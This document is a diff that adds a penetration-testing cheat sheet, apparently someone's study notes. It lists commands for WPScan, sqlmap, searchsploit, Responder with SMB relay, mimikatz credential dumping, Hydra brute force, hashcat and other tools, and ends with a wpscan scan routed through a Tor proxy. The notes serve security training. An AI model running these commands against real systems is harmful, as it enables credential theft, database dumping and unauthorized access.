@@ -1,0 +1,260 @@
+WPScan
+--------------------------------------------------------------------------------
+1. Brute force username/password login
+--> wpscan --url http://10.10.10.10/ -U 'admin' -P /usr/share/wordlists/medium.txt
+
+2. Normal scanning
+--> wpscan --url <URL>
+
+3. Enumerate User
+--> wpscan --url https://10.10.10.10/ --enumerate u
+
+4. Wordpress enumerate user using metasploit
+--> use auxiliary/scanner/http/wordpress_login_enum
+--> FILE_PASS
+--> RHOST (Target)
+--> RPORT 
+--> TARGETURI (URL) - [http://[IP Address of Windows Server 2016]:8080/CEH]
+--> Username
+
+5. Reference 
+--> https://www.youtube.com/watch?v=gg_yUo3hVeg&ab_channel=WPCasts
+
+--------------------------------------------------------------------------------
+Wireshark
+--------------------------------------------------------------------------------
+--> https://ismailtasdelen.medium.com/wireshark-cheat-sheet-43ebca1fbfa7
+
+--------------------------------------------------------------------------------
+tcpdump
+--------------------------------------------------------------------------------
+--> https://hackertarget.com/tcpdump-examples/
+--> https://danielmiessler.com/study/tcpdump/
+
+--------------------------------------------------------------------------------
+SQLMap
+--------------------------------------------------------------------------------
+
+Let’s take an example
+--> http://testphp.vulnweb.com/artists.php?artist=1
+
+
+1. Database command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+-u:  target URL
+–dbs: fetch database name
+–batch: This will leave sqlmap to go with default behavior whenever user’s input would be required
+
+2. Table command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+-D: DBMS database to enumerate (fetched database name)
+–tables: enumerate DBMS database table
+
+3. Collumn command
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+-T: DBMS table to enumerate (fetched table name)
+–columns: enumerate DBMS database columns
+
+4. Retrieve all the data
+--> sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+–dump: dump all information of DBMS database
+
+5. Reference 
+--> https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
+
+--------------------------------------------------------------------------------
+Searchsploit
+--------------------------------------------------------------------------------
+
+1. Update Searchsploit
+--> searchsploit -u
+
+2. Search vulnerabilities
+--> searchsploit linux kernal
+--> searchsploit -t windows 10 (Focus on the Exploit Title)
+
+3. Copy exploit
+--> cp /usr/share/exploitdb/exploits/multiple/remote/8648.py /root/Desktop (Sample)
+
+4. Complete sample
+--> searchsploit “Linux Kernel”
+--> searchsploit -m 7618 — Paste the exploit in the current directory
+--> searchsploit -p 7618[.c] — Show complete path
+--> searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
+
+4. Reference 
+--> https://www.youtube.com/watch?v=29GlfaH5qCM&ab_channel=HackerSploit
+
+--------------------------------------------------------------------------------
+Responder
+--------------------------------------------------------------------------------
+1. Download Responder tool
+--> git clone https://github.com/lgandx/Responder
+
+2. Launch Responder
+--> python Responder.py -I eth0
+--> Check LLMNR / NBT-NS / DNS/MDNS are ON
+
+3. Search shared file on victim host
+--> \\hackme
+
+4. Attacker host (Responder)
+--> Received NTLMv2 Hash of the victim
+
+5. Crack Hash value to get the password using Hashcat
+--> hashcat -m 5600 hashes.txt rockyou.txt -D1 
+--> hashcat -m 5600 hashes.txt rockyou.txt -D1 --show --user
+
+6. SMB Relay
+--> python Multirelay.py -h 
+--> python Multirelay.py -t <Target-IP> -u ALL
+--> Before running Multirelay script, need to turn OFF (SMB and HTTP) options
+--> vim Responder.conf
+
+--> Received hash value of the victim
+--> Forward to the targeted file, to get access as the victim
+
+7. Show password in victim host
+--> help
+--> mimi coffee
+--> mimi sekurlsa::logonpasswords
+
+8. RunFinger
+--> Only work when SMB is disabled.
+--> python RunFinger.py -h
+--> python RunFinger.py -i 192.168.1.0/24
+
+Reference
+--> https://notsosecure.com/pwning-with-responder-a-pentesters-guide/
+--> https://www.youtube.com/watch?v=rjRDsXp_MNk&ab_channel=RajganeshPandurangan
+--> https://www.youtube.com/watch?v=LHv1ud5lnX0&ab_channel=Joostvan%27tZand
+
+
+--------------------------------------------------------------------------------
+Nmap
+--------------------------------------------------------------------------------
+
+1. Scan all ports
+- nmap -p- 10.10.10.10 
+
+2. Scan all opened ports with more details 
+- nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
+
+3. Reference
+- https://www.stationx.net/nmap-cheat-sheet/
+
+--------------------------------------------------------------------------------
+Netdiscover
+--------------------------------------------------------------------------------
+1. Discover hosts
+--> netdiscover -i eth0
+--> netdiscover -r 192.168.1.0/24
+--> netdiscover -i eth0 -P -r 192.168.1.0/24
+
+-i : Interface de Rede (eth0)
+-P : Print (Mostra o Resultado)
+-r : Range (192.168.1.0/24)
+
+2. Reference 
+--> https://kalilinuxtutorials.com/netdiscover-scan-live-hosts-network/
+--> https://www.100security.com.br/netdiscover
+
+
+--------------------------------------------------------------------------------
+Johntheripper
+--------------------------------------------------------------------------------
+1. MD5
+--> john --format=raw-md5 password.txt
+
+Reference 
+--> https://medium.com/@sc015020/how-to-crack-passwords-with-john-the-ripper-fdb98449ff1
+
+
+--------------------------------------------------------------------------------
+Hydra
+--------------------------------------------------------------------------------
+1. Brute Force using Hydra
+
+--> hydra -l root -P passwords.txt [-t 32] <IP> ftp
+--> hydra -L usernames.txt -P pass.txt <IP> mysql
+--> hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+
+--> hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+--> hydra -t 4 -V -f -l administrator -P rockyou.txt rdp://192.168.34.16
+
+--> hydra -P common-snmp-community-strings.txt target.com snmp
+--> hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+--> hydra -l root -P passwords.txt <IP> ssh
+
+2. Description 
+
+-l  Single Username
+-L Username list
+-p Password
+-P Password list
+-t Limit concurrent connections
+-V Verbose output
+-f Stop on correct login
+-s Port
+
+3. Reference 
+--> https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
+--> https://tryhackme.com/room/hydra
+
+
+hydra -l root -P passwords.txt [-t 32] <IP> ftp
+hydra -L usernames.txt -P pass.txt <IP> mysql
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+hydra -P common-snmp-community-strings.txt target.com snmp
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+hydra -l root -P passwords.txt <IP> ssh
+
+--------------------------------------------------------------------------------
+Hashcat
+--------------------------------------------------------------------------------
+1. Hashcat
+--> Crack hash value to plaintext
+
+2. Crack NTLMv2
+--> hashcat -m 5600 ntlmhash.txt rockyou.txt --force
+--> hashcat.exe -m hash.txt rokyou.txt -O
+
+--force = Running utilizing CPU processing
+-O = Process more faster
+
+--> Using "--force" will facing some problems when running the command
+--> Download hashcat binaries at official website of hashcat
+
+--------------------------------------------------------------------------------
+Fuzzing
+--------------------------------------------------------------------------------
+1. Fuzzing
+
+--> gobuster -e -u http://10.10.10.10 -w /usr/share/wordlists/medium.txt
+--> dirb http://10.10.10.10 /usr/share/wordlists/medium.txt
+
+--------------------------------------------------------------------------------
+Cewl
+--------------------------------------------------------------------------------
+
+1. Cewl function
+--> Generate wordlist from a website wording
+
+2. How to use Cewl?
+--> cewl -m 4 -w wordlist.txt http://10.10.10.10
+--> cewl.exe example.com -m 5 -w words.txt
+
+-m = Minimum character that will be put inside the wordlist result
+
+--------------------------------------------------------------------------------
+Metasploit
+--------------------------------------------------------------------------------
+
+Start PostGreSQL: # systemctl restart postgresql Make sure it is working properly: # systemctl status postgresql Now you should be listening on ports 5432 & 5433: # ss -ant Reinitialize DB Settings (user, config files, msfdb): # msfdb reinit Finally, launch MSF: # msfconsole
+
+sudo ruby wpscan.rb -u http://127.0.0.1/wordpress/ --log --proxy socks5://127.0.0.1:9050 --enumerat e u -w ../Downloads/common.txt
